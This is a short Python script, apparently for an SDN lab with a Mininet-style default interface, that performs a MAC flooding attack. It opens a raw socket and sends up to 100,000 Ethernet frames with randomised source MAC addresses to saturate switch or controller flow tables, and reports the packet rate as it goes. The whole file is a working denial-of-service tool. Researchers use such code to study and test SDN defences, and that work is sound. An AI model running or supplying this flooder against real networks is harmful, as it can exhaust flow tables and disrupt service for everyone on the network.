#!/usr/bin/env python3
"""
High-speed MAC flooding attack for SDN flow table saturation
"""

import socket
import struct
import random
import time
import sys

def generate_random_mac():
    return [random.randint(0x00, 0xff) for _ in range(6)]

def run_attack(interface="h1-eth0", num_packets=100000):
    print(f"[*] Starting MAC flood on {interface}...")
    
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((interface, 0))
    except PermissionError:
        print("[!] Error: Must run as root.")
        return
    except Exception as e:
        print(f"[!] Error: {e}")
        return

    packets_sent = 0
    start_time = time.time()

    try:
        for _ in range(num_packets):
            src_mac = generate_random_mac()
            dst_mac = [0x00, 0x00, 0x00, 0x00, 0x00, 0x02] 
            
            # Ethernet header (Dest, Src, Type=IPv4)
            eth_header = struct.pack("!6B6BH", *dst_mac, *src_mac, 0x0800)
            payload = b'\x00' * 46 
            
            s.send(eth_header + payload)
            packets_sent += 1
            
            if packets_sent % 10000 == 0:
                print(f"[*] Sent {packets_sent} packets...")
                
    except KeyboardInterrupt:
        print("\n[*] Aborted.")

    elapsed = time.time() - start_time
    rate = packets_sent / elapsed if elapsed > 0 else 0
    print(f"[*] Sent {packets_sent} packets in {elapsed:.2f}s ({rate:.0f} pps)")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        run_attack(sys.argv[1])
    else:
        run_attack()
